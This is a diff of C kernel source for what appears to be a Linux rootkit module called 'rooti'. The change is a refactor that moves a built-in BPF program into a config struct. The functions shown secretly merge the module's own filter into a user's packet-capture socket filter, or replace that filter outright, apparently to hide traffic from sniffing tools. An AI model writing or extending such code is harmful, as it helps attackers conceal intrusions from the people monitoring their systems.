@@ -3,6 +3,7 @@
 #include <linux/socket.h>
 #include <linux/filter.h>
 #include "net.h"
+#include "../../config.h"
 #include "../../utils.h"
 
 static void rooti_replace_ret_instructions(struct sock_fprog_kern *fprog, loff_t program_offset)
@@ -22,9 +23,9 @@ static void rooti_replace_ret_instructions(struct sock_fprog_kern *fprog, loff_t
     }
 }
 
-static int rooti_merge_fprogs(struct sock_fprog_kern *src_fprog1,
-                                       struct sock_fprog_kern *src_fprog2,
-                                       struct sock_fprog_kern *dst_fprog)
+static int rooti_merge_fprogs(const struct sock_fprog_kern *src_fprog1,
+                              const struct sock_fprog_kern *src_fprog2,
+                              struct sock_fprog_kern *dst_fprog)
 {
     dst_fprog->len = src_fprog1->len + src_fprog2->len;
     dst_fprog->filter = kcalloc(dst_fprog->len, sizeof(struct sock_filter), GFP_KERNEL);
@@ -69,12 +70,13 @@ error_alloc_fprog:
     return ret;
 }
 
-static int rooti_attach_packet_filter(struct sock *sock, struct sock_fprog_kern *fprog)
+static int rooti_attach_packet_filter(struct sock *sock, const struct sock_fprog_kern *fprog)
 {
     struct bpf_prog *bpf_prog;
     int err;
 
-    err = bpf_prog_create(&bpf_prog, fprog);
+    // Casting away the const is safe here, see the code of bpf_prog_create()
+    err = bpf_prog_create(&bpf_prog, (struct sock_fprog_kern *)fprog);
     if (err) {
         ROOTI_DEBUG("bpf_prog_create() failed %d", err);
         goto error_create_prog;
@@ -96,10 +98,6 @@ error_create_prog:
 
 int rooti_inject_packet_filter(struct sock *sock, struct sock_fprog __user *user_fprog)
 {
-    struct sock_fprog_kern rooti_fprog = {
-        .filter = ROOTI_PCAP_BPF_PROG,
-        .len = ROOTI_PCAP_BPF_PROG_COUNT
-    };
     struct sock_fprog_kern user_fprog_kernel;
     struct sock_fprog_kern merged_fprog;
     int err;
@@ -110,7 +108,7 @@ int rooti_inject_packet_filter(struct sock *sock, struct sock_fprog __user *user
         goto out_copy_fprog;
     }
 
-    err = rooti_merge_fprogs(&rooti_fprog, &user_fprog_kernel, &merged_fprog);
+    err = rooti_merge_fprogs(&rooti_config.pcap_fprog, &user_fprog_kernel, &merged_fprog);
     if (err) {
         ROOTI_DEBUG("rooti_merge_fprogs() failed: %d", err);
         goto out_merge_fprogs;
@@ -134,12 +132,7 @@ out_copy_fprog:
 
 int rooti_overwrite_packet_filter(struct sock *sock)
 {
-    struct sock_fprog_kern fprog = {
-        .filter = ROOTI_PCAP_BPF_PROG,
-        .len = ROOTI_PCAP_BPF_PROG_COUNT
-    };
-
-    int err = rooti_attach_packet_filter(sock, &fprog);
+    int err = rooti_attach_packet_filter(sock, &rooti_config.pcap_fprog);
     if (err) {
         ROOTI_DEBUG("rooti_attach_packet_filter() failed: %d", err);
         return err;
